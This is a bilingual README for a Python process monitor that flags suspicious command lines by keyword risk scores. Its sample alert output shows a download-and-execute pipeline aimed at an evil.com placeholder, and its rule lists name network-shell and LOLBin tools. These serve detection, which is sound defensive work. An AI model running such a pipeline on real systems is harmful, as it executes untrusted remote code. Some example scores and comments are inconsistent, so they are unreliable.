 > 🇹🇷 Turkish version is available at the bottom of this file

# Minimal EDR-like Process Monitor

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-informational?style=for-the-badge&logo=linux&logoColor=white&color=0078D4)
![Version](https://img.shields.io/badge/Version-v1.0.0-brightgreen?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)

Version: v1.0 (Initial Release)

This is the first stable iteration of the monitor. It discovers newly spawned processes, applies lightweight pattern-based rules, writes structured logs, and prints high-severity alerts to the console. Future versions will expand capabilities while keeping noise low and performance reasonable.

**Current behavior (v1.0):**
- All detections → `logs/alerts.jsonl` (with severity and risk score)
- `HIGH`/`CRITICAL` → printed to console with color
- `LOW`/`MEDIUM` → logged silently
- Process logging → **disabled by default** (enable with `--log-all`)

---

## Table of Contents

- [Features](#features)
- [Architecture Diagram](#architecture-diagram)
- [Quick Demo](#quick-demo)
- [Setup](#setup)
- [Run Monitor](#run-monitor)
- [Review Tool](#review-tool-optional)
- [Example Output](#example-output)
- [Risk Scores](#risk-scores)
- [File Structure](#file-structure)
- [Notes](#notes)
- [Roadmap](#roadmap-planned-for-v1x)
- [Testing / Generating Alerts](#testing--generating-alerts-safe-examples)
- [🇹🇷 Türkçe Dokümantasyon](#-türkçe-dokümantasyon)

## Features

- **Platform-aware detection**: Different suspicious patterns for Windows vs Unix/Linux/macOS
- **Risk scoring system**: Each pattern has a risk score (20-100)
- **Severity levels**: CRITICAL (≥100), HIGH (≥70), MEDIUM (≥40), LOW (<40)
- **Smart categorization**:
  - Score ≥70 → HIGH/CRITICAL (printed + logged)
  - Score <70 → LOW/MEDIUM (logged silently)
- **Interactive review tool**: CLI tool to review and classify suspicious activities
- **Whitelist support**: Mark safe processes to reduce false positives
- **Timezone-aware timestamps**: UTC ISO8601 with `Z` suffix
- **Burst scanning**: Catch short-lived processes via `--burst`

---

## Architecture Diagram

```
┌──────────────────────────────────────────────────────────────────┐
│                         main.py                                  │
│  Entry point — parses CLI args, starts the monitoring loop       │
└──────────────────────┬───────────────────────────────────────────┘
                       │ calls
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│                        monitor.py                                │
│  Scans running processes via psutil, tracks seen PIDs,           │
│  compares each new process against detection rules               │
└────────┬──────────────────────────────────┬──────────────────────┘
         │ imports rules                    │ calls logger
         ▼                                  ▼
┌─────────────────────┐        ┌────────────────────────────────────┐
│      rules.py       │        │            logger.py               │
│  Defines suspicious │        │  Writes structured JSONL entries   │
│  keyword patterns   │        │  to disk                           │
│  with risk scores   │        │                                    │
└─────────────────────┘        └──────────────┬─────────────────────┘
                                              │ writes
                                              ▼
                               ┌────────────────────────────────────┐
                               │           logs/                    │
                               │  ├── alerts.jsonl                  │
                               │  ├── process_log.jsonl (--log-all) │
                               │  ├── review_queue.jsonl            │
                               │  └── whitelist.jsonl               │
                               └──────────────┬─────────────────────┘
                                              │ reads
                                              ▼
                               ┌────────────────────────────────────┐
                               │         review_tool.py             │
                               │  CLI tool to review, classify,     │
                               │  and whitelist detections          │
                               └────────────────────────────────────┘
```

**Data flow summary:**
1. `main.py` starts the loop and passes config to `monitor.py`
2. `monitor.py` loads patterns from `rules.py` and scans live processes
3. Matches are sent to `logger.py`, which writes structured JSONL to `logs/`
4. `review_tool.py` reads from `logs/` for manual triage workflows

---

## Quick Demo

**Quickest test method** (optional dev tool):
```bash
./dev/demo.sh
```

```
# Expected output:
========================================
  Minimal EDR Monitor — Demo Menu
========================================
  1) Run simulation test (no psutil needed)
  2) Run review tool demo
  3) Start real monitor (30 seconds)
  4) Show log statistics
  q) Quit
----------------------------------------
Select an option:
```

Interactive menu with:
- ✅ Simulation test (no psutil required)
- 🔍 Review tool demo
- 📊 Real system monitoring (30 seconds)
- 📈 Statistics

---

## Setup
```bash
python3 -m pip install -r requirements.txt
```

```
# Expected output:
Collecting psutil>=5.9.0
  Downloading psutil-5.9.8-cp311-cp311-macosx_10_9_x86_64.whl (248 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 248.3/248.3 kB 2.1 MB/s eta 0:00:00
Successfully installed psutil-5.9.8
```

**or with virtualenv:**
```bash
python3 -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
pip install -r requirements.txt
```

```
# Expected output:
created virtual environment CPython3.11.0.final.0-64 in 1234ms
  creator CPython3Posix(dest=.venv, clear=False, no_vcs_ignore=False, with_pip=True)
Collecting psutil>=5.9.0
  ...
Successfully installed psutil-5.9.8
```

---

## Run Monitor
```bash
python3 main.py
```

```
# Expected output:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

Run options:
```bash
# Base interval (seconds), default 1
python3 main.py --interval 1
```

```
# Expected output:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

```bash
# Burst scanning N times per interval with sleep between bursts
python3 main.py --burst 10 --burst-sleep 0.05
```

```
# Expected output:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

```bash
# Enable logging of all processes (default: off, only alerts are logged)
python3 main.py --log-all
```

```
# Expected output:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

---

## Review Tool (Optional)

*Note: v1.0 logs all detections to `alerts.jsonl` by default. The review tool is available for manual workflows.*

```bash
# Review pending records
python3 review_tool.py
```

```
# Expected output:
===== EDR Review Tool =====
Pending records: 3

[1/3] 2026-03-16T10:22:05Z
  PID: 4521 | Score: 75 | Severity: HIGH
  Command: bash -c "sleep 2; echo 'curl http://example.com'"
  Matches: ['curl(25)', 'bash -c(60)']
Action? [b]enign / [s]uspicious / [w]hitelist / [skip]:
```

```bash
# Show statistics
python3 review_tool.py --stats
```

```
# Expected output:
===== EDR Statistics =====
Total alerts logged : 12
  CRITICAL          : 1
  HIGH              : 4
  MEDIUM            : 5
  LOW               : 2
Whitelisted entries : 3
Pending review      : 2
```

```bash
# Show all records
python3 review_tool.py --all
```

```
# Expected output:
===== All Records =====
[2026-03-16T10:20:01Z] CRITICAL | PID 1234 | Score 110 | bash -c curl http://evil.com | base64 -d | bash
[2026-03-16T10:21:14Z] HIGH     | PID 4521 | Score  75 | bash -c "sleep 2; echo 'curl ...'"
[2026-03-16T10:22:05Z] MEDIUM   | PID 6643 | Score  50 | python3 -c "import os; os.getcwd()"
...
```

---

## Example Output

### High Severity (printed to console)
```
🚨 [DETECTION - CRITICAL]
   PID: 1234 | Score: 110
   Matches: ['base64 -d(80)', 'bash -c(60)', 'curl(25)']
   Command: bash -c curl http://evil.com | base64 -d | bash
```

### Low/Medium Severity (logged silently)
```
# Not printed to console; written to logs/alerts.jsonl only
{"severity":"MEDIUM","risk_score":50,"matches":["curl(25)"],"pid":5678,...}
```

---

## Risk Scores

**High Risk (80-100)**
- Encoded commands (`-enc`, `-encodedcommand`)
- Direct TCP connections (`/dev/tcp`)
- Base64 decoding (`base64 -d`)
- DLL execution (`rundll32`, `mshta`, `regsvr32`)

**Medium Risk (50-79)**
- Shell interpreters with inline commands (`bash -c`, `powershell`)
- Network tools (`wget`, `curl`, `nc`)
- Script interpreters with inline code (`python -c`, `perl -e`)

**Low Risk (20-49)**
- Command chaining (`&&`, `||`, `|`)
- URL patterns (`http://`, `https://`)

---

## File Structure

```
logs/
├── process_log.jsonl       # All new processes (optional, requires --log-all)
├── alerts.jsonl            # High threat (score ≥70)
├── review_queue.jsonl      # Requires review (score 30-69) — optional workflow
└── whitelist.jsonl         # Marked as safe (optional)

JSONL schemas:
- `process_log.jsonl`: `{timestamp, pid, name, exe, cmdline, create_time, username}` (only created with --log-all)
- `alerts.jsonl`: `{timestamp, pid, name, cmdline, matches, risk_score, severity}`
```

---

## AGENTS.md

This project includes an `AGENTS.md` file designed to be read by AI coding assistants (Claude, Copilot, Cursor, etc.) before making any changes to the codebase.

It covers:
- Architecture and file roles
- Critical rules and boundaries (what must not be changed)
- Coding style and conventions
- Known intentional limitations
- Safe test commands with expected scores

If you are an AI assistant working on this project, read `AGENTS.md` first.

---

## Notes
- Only NEW PIDs are logged (tracker kept in-memory).
- Handles `psutil.NoSuchProcess` and `psutil.AccessDenied` gracefully.
- Suspicious keywords are defined in `rules.py`.
- Platform detection is automatic via `platform.system()`.
- Review decisions are persistent and can be audited.
- Short, common enumeration commands (e.g., `whoami`, `uname -a`, `id`) are intentionally not flagged to reduce noise; extremely short-lived processes may be missed unless burst scanning is enabled or commands are delayed (e.g., `bash -c 'sleep 2; whoami'`).
- Only `HIGH`/`CRITICAL` alerts print to console; `LOW`/`MEDIUM` are written to `alerts.jsonl`.
- Dev/demo helpers are archived under `dev/`. You may remove them entirely.

---

## Roadmap (Planned for v1.x+)

- **Parent/child process lineage**: Track process ancestry and spawning chains.
- **Persistent baselines**: Save seen PIDs and whitelists across restarts.
- **Extended detection rules**: File writes to sensitive paths, outbound network connections, privilege escalation.
- **Configuration file support**: YAML/JSON config for rules, thresholds, log paths.
- **Packaging**: Install via `pipx` or standalone binary; systemd/launchd service templates.
- **Integrations**: Webhook alerts, syslog forwarding, SIEM-friendly JSON output.

---

## Testing / Generating Alerts (Safe examples)

Below are safe, non-harmful example commands you can run locally to generate alert entries while the monitor is running. These commands *do not* download or execute untrusted code — they only include suspicious keywords (echoed) so the monitor's pattern-matching triggers.

Linux / macOS (bash/zsh):
```zsh
# Produces a process whose cmdline contains 'curl' (no network call)
bash -c "sleep 2; echo 'curl http://example.com'"
```

```
# Expected output (in monitor console):
🚨 [DETECTION - CRITICAL]
   PID: 8821 | Score: 135
   Matches: ['bash -c(60)', 'http://(35)', 'curl(25)', ';(15)']
   Command: bash -c "sleep 2; echo 'curl http://example.com'"
```

```zsh
# Includes a 'base64' token and a pipe '|' in the command string
bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
```

```
# Expected output (in monitor console):
🚨 [DETECTION - HIGH]
   PID: 8834 | Score: 75
   Matches: ['bash -c(60)', '|(15)']
   Command: bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
```

```zsh
# Shows an inline interpreter token (python -c) but only echoes the string
bash -c "sleep 2; echo 'python -c \"print(1)\"'"
```

```
# Expected output (in monitor console):
🚨 [DETECTION - CRITICAL]
   PID: 8847 | Score: 125
   Matches: ['bash -c(60)', 'python -c(50)', ';(15)']
   Command: bash -c "sleep 2; echo 'python -c \"print(1)\"'"
```

Windows (PowerShell) — run from an Administrator/regular PowerShell prompt:
```powershell
# Safe: prints an Invoke-Expression-like token, does not execute it
powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
```

```
# Expected output (in monitor console):
🚨 [DETECTION - HIGH]
   PID: 3310 | Score: 70
   Matches: ['powershell(70)']
   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
```

```powershell
# Safe encoded-like token (no execution)
powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
```

```
# Expected output (in monitor console):
🚨 [DETECTION - CRITICAL]
   PID: 3325 | Score: 170
   Matches: ['-encodedcommand(100)', 'powershell(70)']
   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
```

Notes:
- These examples use `sleep`/`Start-Sleep` so the process exists long enough to be observed. Without a delay the monitor may miss very short-lived commands.
- For higher detection reliability, run the monitor with `--burst N --burst-sleep 0.05` (e.g., `--burst 10`).
- The strings shown (e.g., `curl`, `base64`, `python -c`) are matched by `rules.py` and will produce entries in `logs/alerts.jsonl` with an associated `risk_score` and `severity`.

---

# 🇹🇷 Türkçe Dokümantasyon

> 🇬🇧 English version is available at the top of this file

# Minimal EDR Benzeri Süreç İzleyici

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-informational?style=for-the-badge&logo=linux&logoColor=white&color=0078D4)
![Version](https://img.shields.io/badge/Sürüm-v1.0.0-brightgreen?style=for-the-badge)
![License](https://img.shields.io/badge/Lisans-MIT-yellow?style=for-the-badge)

Sürüm: v1.0 (İlk Kararlı Sürüm)

Bu, izleyicinin ilk kararlı iterasyonudur. Yeni başlayan süreçleri keşfeder, hafif örüntü tabanlı kurallar uygular, yapılandırılmış günlükler yazar ve yüksek öncelikli uyarıları konsola yazdırır. Gelecekteki sürümler, gürültüyü düşük ve performansı makul tutarken yetenekleri genişletecektir.

**v1.0'ın mevcut davranışı:**
- Tüm tespitler → `logs/alerts.jsonl` (önem düzeyi ve risk puanıyla birlikte)
- `HIGH`/`CRITICAL` → konsolda renkli olarak gösterilir
- `LOW`/`MEDIUM` → sessizce günlüğe kaydedilir
- Süreç günlüğü → **varsayılan olarak devre dışı** (`--log-all` ile etkinleştirin)

---

## İçindekiler (TR)

- [Özellikler](#özellikler)
- [Mimari Diyagram](#mimari-diyagram)
- [Hızlı Demo](#hızlı-demo)
- [Kurulum](#kurulum)
- [İzleyiciyi Çalıştırma](#i̇zleyiciyi-çalıştırma)
- [İnceleme Aracı](#i̇nceleme-aracı-isteğe-bağlı)
- [Örnek Çıktı](#örnek-çıktı)
- [Risk Puanları](#risk-puanları)
- [Dosya Yapısı](#dosya-yapısı)
- [Notlar](#notlar)
- [Yol Haritası](#yol-haritası-v1x-için-planlandı)
- [Test / Uyarı Oluşturma](#test--uyarı-oluşturma-güvenli-örnekler)

---

## Özellikler

- **Platforma özgü tespit**: Windows ve Unix/Linux/macOS için farklı şüpheli örüntüler
- **Risk puanlama sistemi**: Her örüntünün bir risk puanı vardır (20-100 arası)
- **Önem düzeyleri**: CRITICAL (≥100), HIGH (≥70), MEDIUM (≥40), LOW (<40)
- **Akıllı sınıflandırma**:
  - Puan ≥70 → HIGH/CRITICAL (konsola yazdırılır + günlüğe kaydedilir)
  - Puan <70 → LOW/MEDIUM (sessizce günlüğe kaydedilir)
- **Etkileşimli inceleme aracı**: Şüpheli etkinlikleri incelemek ve sınıflandırmak için CLI aracı
- **Beyaz liste desteği**: Yanlış pozitifleri azaltmak için güvenli süreçleri işaretleyin
- **Saat dilimi uyumlu zaman damgaları**: `Z` sonekiyle UTC ISO8601
- **Burst taraması**: `--burst` ile kısa ömürlü süreçleri yakalayın

---

## Mimari Diyagram

```
┌──────────────────────────────────────────────────────────────────┐
│                         main.py                                  │
│  Giriş noktası — CLI argümanlarını ayrıştırır, izleme döngüsünü  │
│  başlatır                                                        │
└──────────────────────┬───────────────────────────────────────────┘
                       │ çağırır
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│                        monitor.py                                │
│  psutil ile çalışan süreçleri tarar, görülen PID'leri takip     │
│  eder, her yeni süreci tespit kurallarıyla karşılaştırır         │
└────────┬──────────────────────────────────┬──────────────────────┘
         │ kuralları içe aktarır            │ logger'ı çağırır
         ▼                                  ▼
┌─────────────────────┐        ┌────────────────────────────────────┐
│      rules.py       │        │            logger.py               │
│  Risk puanlarıyla   │        │  Yapılandırılmış JSONL girdilerini │
│  şüpheli anahtar    │        │  diske yazar                       │
│  kelime örüntülerini│        │                                    │
│  tanımlar           │        │                                    │
└─────────────────────┘        └──────────────┬─────────────────────┘
                                              │ yazar
                                              ▼
                               ┌────────────────────────────────────┐
                               │           logs/                    │
                               │  ├── alerts.jsonl                  │
                               │  ├── process_log.jsonl (--log-all) │
                               │  ├── review_queue.jsonl            │
                               │  └── whitelist.jsonl               │
                               └──────────────┬─────────────────────┘
                                              │ okur
                                              ▼
                               ┌────────────────────────────────────┐
                               │         review_tool.py             │
                               │  Tespitleri incelemek, sınıflandır-│
                               │  mak ve beyaz listeye almak için   │
                               │  CLI aracı                         │
                               └────────────────────────────────────┘
```

**Veri akışı özeti:**
1. `main.py` döngüyü başlatır ve yapılandırmayı `monitor.py`'ye geçirir
2. `monitor.py` örüntüleri `rules.py`'den yükler ve canlı süreçleri tarar
3. Eşleşmeler `logger.py`'ye gönderilir; bu da yapılandırılmış JSONL'yi `logs/` dizinine yazar
4. `review_tool.py` manuel önceliklendirme iş akışları için `logs/` dizininden okur

---

## Hızlı Demo

**En hızlı test yöntemi** (isteğe bağlı geliştirici aracı):
```bash
./dev/demo.sh
```

```
# Beklenen çıktı:
========================================
  Minimal EDR Monitor — Demo Menu
========================================
  1) Run simulation test (no psutil needed)
  2) Run review tool demo
  3) Start real monitor (30 seconds)
  4) Show log statistics
  q) Quit
----------------------------------------
Select an option:
```

Etkileşimli menü:
- ✅ Simülasyon testi (psutil gerekmez)
- 🔍 İnceleme aracı demosu
- 📊 Gerçek sistem izleme (30 saniye)
- 📈 İstatistikler

---

## Kurulum

```bash
python3 -m pip install -r requirements.txt
```

```
# Beklenen çıktı:
Collecting psutil>=5.9.0
  Downloading psutil-5.9.8-cp311-cp311-macosx_10_9_x86_64.whl (248 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 248.3/248.3 kB 2.1 MB/s eta 0:00:00
Successfully installed psutil-5.9.8
```

**veya sanal ortamla:**
```bash
python3 -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate


```

```
# Beklenen çıktı:
created virtual environment CPython3.11.0.final.0-64 in 1234ms
  creator CPython3Posix(dest=.venv, clear=False, no_vcs_ignore=False, with_pip=True)
Collecting psutil>=5.9.0
  ...
Successfully installed psutil-5.9.8
```

---

## İzleyiciyi Çalıştırma

```bash
python3 main.py
```

```
# Beklenen çıktı:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

Çalıştırma seçenekleri:
```bash
# Temel aralık (saniye cinsinden), varsayılan 1
python3 main.py --interval 1
```

```
# Beklenen çıktı:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

```bash
# Aralık başına N kere burst taraması, burst'ler arasında uyku
python3 main.py --burst 10 --burst-sleep 0.05
```

```
# Beklenen çıktı:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

```bash
# Tüm süreçlerin günlüğünü etkinleştir (varsayılan: kapalı, yalnızca uyarılar kaydedilir)
python3 main.py --log-all
```

```
# Beklenen çıktı:
Starting minimal EDR-like process monitor v1.0.0 on Darwin.
Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
```

---

## İnceleme Aracı (İsteğe Bağlı)

*Not: v1.0, tüm tespitleri varsayılan olarak `alerts.jsonl`'ye kaydeder. İnceleme aracı manuel iş akışları için mevcuttur.*

```bash
# Bekleyen kayıtları incele
python3 review_tool.py
```

```
# Beklenen çıktı:
===== EDR Review Tool =====
Pending records: 3

[1/3] 2026-03-16T10:22:05Z
  PID: 4521 | Score: 75 | Severity: HIGH
  Command: bash -c "sleep 2; echo 'curl http://example.com'"
  Matches: ['curl(25)', 'bash -c(60)']
Action? [b]enign / [s]uspicious / [w]hitelist / [skip]:
```

```bash
# İstatistikleri göster
python3 review_tool.py --stats
```

```
# Beklenen çıktı:
===== EDR Statistics =====
Total alerts logged : 12
  CRITICAL          : 1
  HIGH              : 4
  MEDIUM            : 5
  LOW               : 2
Whitelisted entries : 3
Pending review      : 2
```

```bash
# Tüm kayıtları göster
python3 review_tool.py --all
```

```
# Beklenen çıktı:
===== All Records =====
[2026-03-16T10:20:01Z] CRITICAL | PID 1234 | Score 110 | bash -c curl http://evil.com | base64 -d | bash
[2026-03-16T10:21:14Z] HIGH     | PID 4521 | Score  75 | bash -c "sleep 2; echo 'curl ...'"
[2026-03-16T10:22:05Z] MEDIUM   | PID 6643 | Score  50 | python3 -c "import os; os.getcwd()"
...
```

---

## Örnek Çıktı

### Yüksek Önem Düzeyi (konsola yazdırılır)
```
🚨 [DETECTION - CRITICAL]
   PID: 1234 | Score: 110
   Matches: ['base64 -d(80)', 'bash -c(60)', 'curl(25)']
   Command: bash -c curl http://evil.com | base64 -d | bash
```

### Düşük/Orta Önem Düzeyi (sessizce kaydedilir)
```
# Konsola yazdırılmaz; yalnızca logs/alerts.jsonl dosyasına yazılır
{"severity":"MEDIUM","risk_score":50,"matches":["curl(25)"],"pid":5678,...}
```

---

## Risk Puanları

**Yüksek Risk (80-100)**
- Kodlanmış komutlar (`-enc`, `-encodedcommand`)
- Doğrudan TCP bağlantıları (`/dev/tcp`)
- Base64 çözme (`base64 -d`)
- DLL çalıştırma (`rundll32`, `mshta`, `regsvr32`)

**Orta Risk (50-79)**
- Satır içi komutlarla kabuk yorumlayıcıları (`bash -c`, `powershell`)
- Ağ araçları (`wget`, `curl`, `nc`)
- Satır içi kodla betik yorumlayıcıları (`python -c`, `perl -e`)

**Düşük Risk (20-49)**
- Komut zincirleme (`&&`, `||`, `|`)
- URL örüntüleri (`http://`, `https://`)

---

## Dosya Yapısı

```
logs/
├── process_log.jsonl       # Tüm yeni süreçler (isteğe bağlı, --log-all gerektirir)
├── alerts.jsonl            # Yüksek tehdit (puan ≥70)
├── review_queue.jsonl      # İnceleme gerektirir (puan 30-69) — isteğe bağlı iş akışı
└── whitelist.jsonl         # Güvenli olarak işaretlenmiş (isteğe bağlı)

JSONL şemaları:
- `process_log.jsonl`: `{timestamp, pid, name, exe, cmdline, create_time, username}` (yalnızca --log-all ile oluşturulur)
- `alerts.jsonl`: `{timestamp, pid, name, cmdline, matches, risk_score, severity}`
```

---

## AGENTS.md

Bu proje, kod tabanında herhangi bir değişiklik yapmadan önce yapay zeka kodlama araçları (Claude, Copilot, Cursor vb.) tarafından okunmak üzere tasarlanmış bir `AGENTS.md` dosyası içermektedir.

Kapsadığı konular:
- Mimari ve dosya rolleri
- Kritik kurallar ve sınırlar (değiştirilmemesi gerekenler)
- Kodlama stili ve kuralları
- Bilinen kasıtlı kısıtlamalar
- Beklenen skorlarla birlikte güvenli test komutları

Bu proje üzerinde çalışan bir yapay zeka aracıysanız önce `AGENTS.md` dosyasını okuyun.

---

## Notlar

- Yalnızca YENİ PID'ler günlüğe kaydedilir (izleyici bellekte tutulur).
- `psutil.NoSuchProcess` ve `psutil.AccessDenied` hataları zarif biçimde ele alınır.
- Şüpheli anahtar kelimeler `rules.py` içinde tanımlanmıştır.
- Platform tespiti `platform.system()` aracılığıyla otomatiktir.
- İnceleme kararları kalıcıdır ve denetlenebilir.
- Kısa, yaygın numaralandırma komutları (örn. `whoami`, `uname -a`, `id`) gürültüyü azaltmak amacıyla kasıtlı olarak işaretlenmez; son derece kısa ömürlü süreçler, burst taraması etkinleştirilmediği veya komutlar geciktirilmediği sürece (örn. `bash -c 'sleep 2; whoami'`) kaçabilir.
- Yalnızca `HIGH`/`CRITICAL` uyarılar konsola yazdırılır; `LOW`/`MEDIUM` ise `alerts.jsonl` dosyasına yazılır.
- Geliştirici/demo yardımcıları `dev/` altında arşivlenir. Bunları tamamen kaldırabilirsiniz.

---

## Yol Haritası (v1.x+ için Planlandı)

- **Ebeveyn/çocuk süreç soy ağacı**: Süreç soyunu ve üretme zincirlerini takip etme.
- **Kalıcı temel çizgiler**: Görülen PID'leri ve beyaz listeleri yeniden başlatmalar arasında kaydetme.
- **Genişletilmiş tespit kuralları**: Hassas yollara dosya yazma, giden ağ bağlantıları, ayrıcalık yükseltme.
- **Yapılandırma dosyası desteği**: Kurallar, eşikler ve günlük yolları için YAML/JSON yapılandırması.
- **Paketleme**: `pipx` veya bağımsız ikili ile kurulum; systemd/launchd servis şablonları.
- **Entegrasyonlar**: Webhook uyarıları, syslog iletimi, SIEM uyumlu JSON çıktısı.

---

## Test / Uyarı Oluşturma (Güvenli Örnekler)

Aşağıda, izleyici çalışırken uyarı girişleri oluşturmak için yerel olarak çalıştırabileceğiniz güvenli, zararsız örnek komutlar bulunmaktadır. Bu komutlar güvenilmeyen kodu *indirmez veya çalıştırmaz* — yalnızca şüpheli anahtar kelimeleri (yankılanmış) içerir, böylece izleyicinin örüntü eşleştirmesi tetiklenir.

Linux / macOS (bash/zsh):
```zsh
# Komut satırında 'curl' içeren bir süreç oluşturur (ağ çağrısı yok)
bash -c "sleep 2; echo 'curl http://example.com'"
```

```
# Beklenen çıktı (izleyici konsolunda):
🚨 [DETECTION - CRITICAL]
   PID: 8821 | Score: 135
   Matches: ['bash -c(60)', 'http://(35)', 'curl(25)', ';(15)']
   Command: bash -c "sleep 2; echo 'curl http://example.com'"
```

```zsh
# Komut dizesinde 'base64' belirteci ve '|' borusu içerir
bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
```

```
# Beklenen çıktı (izleyici konsolunda):
🚨 [DETECTION - HIGH]
   PID: 8834 | Score: 75
   Matches: ['bash -c(60)', '|(15)']
   Command: bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
```

```zsh
# Satır içi yorumlayıcı belirteci (python -c) gösterir, ancak yalnızca dizeyi yankılar
bash -c "sleep 2; echo 'python -c \"print(1)\"'"
```

```
# Beklenen çıktı (izleyici konsolunda):
🚨 [DETECTION - CRITICAL]
   PID: 8847 | Score: 125
   Matches: ['bash -c(60)', 'python -c(50)', ';(15)']
   Command: bash -c "sleep 2; echo 'python -c \"print(1)\"'"
```

Windows (PowerShell) — Yönetici/normal PowerShell isteminden çalıştırın:
```powershell
# Güvenli: Invoke-Expression benzeri belirteç yazdırır, çalıştırmaz
powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
```

```
# Beklenen çıktı (izleyici konsolunda):
🚨 [DETECTION - HIGH]
   PID: 3310 | Score: 70
   Matches: ['powershell(70)']
   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
```

```powershell
# Güvenli kodlanmış benzeri belirteç (çalıştırma yok)
powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
```

```
# Beklenen çıktı (izleyici konsolunda):
🚨 [DETECTION - CRITICAL]
   PID: 3325 | Score: 170
   Matches: ['-encodedcommand(100)', 'powershell(70)']
   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
```

Notlar:
- Bu örnekler, sürecin gözlemlenebilmesi için yeterince uzun süre var olması amacıyla `sleep`/`Start-Sleep` kullanır. Gecikme olmadan izleyici çok kısa ömürlü komutları kaçırabilir.
- Daha yüksek tespit güvenilirliği için izleyiciyi `--burst N --burst-sleep 0.05` ile çalıştırın (örn. `--burst 10`).
- Gösterilen dizeler (örn. `curl`, `base64`, `python -c`) `rules.py` tarafından eşleştirilir ve ilişkili `risk_score` ve `severity` ile `logs/alerts.jsonl` dosyasına giriş oluşturur.
